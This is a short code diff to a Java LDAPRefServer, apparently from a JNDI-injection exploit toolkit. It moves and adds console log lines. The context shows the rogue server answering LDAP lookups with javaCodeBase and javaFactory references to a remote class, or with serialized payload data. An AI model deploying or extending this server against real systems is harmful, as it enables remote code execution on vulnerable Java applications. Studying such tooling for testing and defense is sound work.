@@ -132,7 +132,6 @@ public class LDAPRefServer {
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
             URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
             e.addAttribute("javaClassName", "foo");
             String cbstring = this.codebase.toString();
             int refPos = cbstring.indexOf('#');
@@ -143,6 +142,7 @@ public class LDAPRefServer {
                 e.addAttribute("javaCodeBase", cbstring);
                 e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                 e.addAttribute("javaFactory", this.codebase.getRef());
+                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
             } else {
                 File sendFile = null;
                 if (Paths.get(file).toFile().isDirectory()) {
@@ -167,6 +167,7 @@ public class LDAPRefServer {
                 } catch (Exception ex) {
                     ex.printStackTrace();
                 }
+                System.out.println("Send serialization data(" + sendFile.getName() + ") result");
             }
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
